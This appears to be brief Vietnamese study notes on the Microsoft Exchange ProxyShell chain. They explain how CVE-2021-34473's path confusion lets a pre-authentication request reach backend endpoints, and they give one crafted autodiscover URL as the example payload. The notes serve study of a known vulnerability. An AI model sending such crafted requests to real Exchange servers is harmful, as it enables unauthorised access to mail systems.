# ProxyShell

[https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell](https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell)

[https://blog.viettelcybersecurity.com/pwn2own-2021-microsoft-exchange-exploit-chain/](https://blog.viettelcybersecurity.com/pwn2own-2021-microsoft-exchange-exploit-chain/)

## **CVE-2021-34473 - Pre-auth Path Confusion**

Lỗ hổng xảy ra ở quá trình frontend (Client Access Service - CAS) tính toán backend URL.

Nếu HTTP request được phân loại thành Explicit Logon Request thì frontend sẽ normalize: xóa bỏ phần mailbox address trước khi đưa đến backend.

Nếu nhập

```
https://exchange/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com
```

sẽ thành:

```
https://exchange/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com
```
